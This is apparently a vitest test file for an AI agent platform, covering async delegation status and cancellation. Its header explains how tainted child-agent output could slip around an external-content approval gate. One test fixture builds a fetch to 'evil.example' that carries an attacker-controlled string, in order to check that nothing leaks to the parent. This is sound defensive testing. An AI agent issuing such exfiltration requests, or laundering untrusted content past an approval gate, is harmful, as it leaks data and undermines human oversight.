/**
 * Async delegation status + cancel.
 *
 * The load-bearing assertion here is the NEGATIVE one: the status view must never
 * carry child text. A delegated child routinely reads untrusted external content,
 * so if a parent could poll its output as "progress" it would act on tainted data
 * without ever crossing the external-content approval gate — laundering straight
 * around the boundary. Completion text reaches the parent only through the gated
 * wake. Progress is metadata.
 */
import { beforeEach, afterEach, describe, expect, it, vi } from 'vitest';
import Database from 'better-sqlite3';
import { getDb, setDb } from '../database/db';
import { runMigrations } from '../database/migrations';

const { abortSession } = vi.hoisted(() => ({ abortSession: vi.fn() }));
vi.mock('../services/opencode_engine', () => ({
  opencodeClient: { abortSession },
  opencodeSessionMap: new Map<string, string>(),
}));

import {
  cancelDelegation,
  getDelegationStatus,
} from '../services/async_delegation_status_service';
import { AgentAsyncDelegationsRepository } from '../repositories/agent_async_delegations_repository';
import { AgentSessionMessagesRepository } from '../repositories/agent_session_messages_repository';

const SECRET = 'ATTACKER-CONTROLLED-STRING-FROM-AN-EMAIL';

function seedSession(id: string, status = 'idle', sdk = `ses_${id}`): void {
  getDb()
    .prepare(
      `INSERT INTO agent_sessions (id, name, agent_kind, status, cwd, sdk_session_id, category)
       VALUES (?, ?, 'librarian', ?, '/tmp', ?, 'chat')`,
    )
    .run(id, `s-${id}`, status, sdk);
}

function seedDelegation(input: {
  id: string; parent: string; child: string; status?: string;
  completionText?: string | null; createdAt?: string; completedAt?: string | null;
}): void {
  getDb()
    .prepare(
      `INSERT INTO agent_async_delegations
        (id, parent_session_id, child_session_id, target_agent_config_id, status,
         completion_text, error_text, completed_at, notified_at, created_at, updated_at)
       VALUES (?, ?, ?, 'planning-agent', ?, ?, NULL, ?, NULL, ?, ?)`,
    )
    .run(
      input.id, input.parent, input.child, input.status ?? 'dispatched',
      input.completionText ?? null, input.completedAt ?? null,
      input.createdAt ?? '2026-08-05T20:00:00.000Z', '2026-08-05T20:00:00.000Z',
    );
}

beforeEach(() => {
  abortSession.mockReset();
  abortSession.mockResolvedValue(true);
  const db = new Database(':memory:');
  db.pragma('foreign_keys = ON');
  runMigrations(db);
  setDb(db);
});
afterEach(() => vi.clearAllMocks());

describe('async delegation status', () => {
  it('NEVER leaks child text — not completion text, not tool args, not tool output', () => {
    seedSession('parent-1');
    seedSession('child-1', 'working');
    seedDelegation({
      id: 'dg-1', parent: 'parent-1', child: 'child-1',
      completionText: SECRET,
    });
    // A child tool call whose ARGUMENTS and OUTPUT are attacker-controlled.
    new AgentSessionMessagesRepository().upsertPart('child-1', 'msg-c1', {
      type: 'tool',
      id: 'prt-1',
      callID: 'call-1',
      messageID: 'msg-c1',
      tool: 'webfetch',
      state: {
        status: 'running',
        input: { url: `https://evil.example/${SECRET}` },
        output: SECRET,
      },
    });

    const view = getDelegationStatus('parent-1');
    expect(view).toHaveLength(1);
    // The whole serialized view must not contain the string anywhere.
    expect(JSON.stringify(view)).not.toContain(SECRET);
    // The tool NAME is safe and IS surfaced — it comes from Rhythm's registry.
    expect(view[0].latestEvent).toEqual({ tool: 'webfetch', status: 'running' });
  });

  it('reports state, elapsed time and a coarse step count', () => {
    seedSession('parent-2');
    seedSession('child-2', 'working');
    seedDelegation({ id: 'dg-2', parent: 'parent-2', child: 'child-2' });
    const repo = new AgentSessionMessagesRepository();
    repo.append('child-2', 'output', 'a', 'a');
    repo.append('child-2', 'output', 'b', 'b');

    const [v] = getDelegationStatus('parent-2');
    expect(v.state).toBe('dispatched');
    expect(v.target).toBe('planning-agent');
    expect(v.childState).toBe('working');
    expect(v.childSteps).toBe(2);
    expect(v.elapsedMs).toBeGreaterThan(0);
    expect(v.durationMs).toBeNull();
    expect(v.cancellable).toBe(true);
  });

  it('freezes elapsed at completion instead of counting forever', () => {
    seedSession('parent-3');
    seedSession('child-3');
    seedDelegation({
      id: 'dg-3', parent: 'parent-3', child: 'child-3', status: 'notified',
      createdAt: '2026-08-05T20:00:00.000Z', completedAt: '2026-08-05T20:00:30.000Z',
    });
    const [v] = getDelegationStatus('parent-3');
    expect(v.elapsedMs).toBe(30_000);
    expect(v.durationMs).toBe(30_000);
    expect(v.cancellable).toBe(false);
  });

  it('returns [] for a parent that has delegated nothing', () => {
    seedSession('parent-4');
    expect(getDelegationStatus('parent-4')).toEqual([]);
  });
});

describe('async delegation cancel', () => {
  it('aborts the child engine session and marks the row cancelled', async () => {
    seedSession('parent-5');
    seedSession('child-5', 'working', 'ses_child_5');
    seedDelegation({ id: 'dg-5', parent: 'parent-5', child: 'child-5' });

    const view = await cancelDelegation('parent-5', 'dg-5');
    expect(abortSession).toHaveBeenCalledWith('ses_child_5', '/tmp');
    expect(view.state).toBe('cancelled');
    expect(view.cancellable).toBe(false);
    expect(new AgentAsyncDelegationsRepository().findById('dg-5')?.status).toBe('cancelled');
  });

  it("refuses to cancel another session's delegation", async () => {
    seedSession('parent-6');
    seedSession('intruder-6');
    seedSession('child-6', 'working');
    seedDelegation({ id: 'dg-6', parent: 'parent-6', child: 'child-6' });

    await expect(cancelDelegation('intruder-6', 'dg-6')).rejects.toThrow(
      /another session/i,
    );
    expect(abortSession).not.toHaveBeenCalled();
  });

  it('refuses a terminal delegation so the caller learns the result already landed', async () => {
    seedSession('parent-7');
    seedSession('child-7');
    seedDelegation({ id: 'dg-7', parent: 'parent-7', child: 'child-7', status: 'notified' });
    await expect(cancelDelegation('parent-7', 'dg-7')).rejects.toThrow(/already notified/i);
    expect(abortSession).not.toHaveBeenCalled();
  });

  it('claims the row BEFORE aborting, so a cancel is never reported as a failure', async () => {
    // Observed live 2026-08-05: aborting first drove the completion pipeline, which
    // marked the row terminal and woke the parent — then markCancelled found
    // nothing to transition and the API returned 400 "completed before it could be
    // cancelled". The child had in fact been killed. Order is the fix.
    seedSession('parent-9');
    seedSession('child-9', 'working', 'ses_child_9');
    seedDelegation({ id: 'dg-9', parent: 'parent-9', child: 'child-9' });
    const repo = new AgentAsyncDelegationsRepository();
    // At the moment the engine abort is issued, the row must ALREADY be cancelled.
    let statusAtAbort: string | undefined;
    abortSession.mockImplementation(async () => {
      statusAtAbort = repo.findById('dg-9')?.status;
      return true;
    });

    const view = await cancelDelegation('parent-9', 'dg-9');
    expect(statusAtAbort).toBe('cancelled');
    expect(view.state).toBe('cancelled');
  });

  it('a completing child can NEVER resurrect a cancelled delegation or wake the parent', () => {
    seedSession('parent-10');
    seedSession('child-10', 'working');
    seedDelegation({ id: 'dg-10', parent: 'parent-10', child: 'child-10', status: 'cancelled' });
    const repo = new AgentAsyncDelegationsRepository();
    // The child finishes anyway — a race the abort cannot rule out.
    repo.markCompleted('child-10', 'a result the user cancelled');
    expect(repo.findById('dg-10')?.status).toBe('cancelled');
    expect(repo.findById('dg-10')?.completionText).toBeNull();
    // And it must not be claimable for a wake.
    expect(repo.claimCompletedForParent('parent-10')).toEqual([]);
  });

  it('still marks the row when the engine abort fails, so the parent is not left polling forever', async () => {
    abortSession.mockRejectedValue(new Error('engine down'));
    seedSession('parent-8');
    seedSession('child-8', 'working');
    seedDelegation({ id: 'dg-8', parent: 'parent-8', child: 'child-8' });

    const view = await cancelDelegation('parent-8', 'dg-8');
    expect(view.state).toBe('cancelled');
  });
});
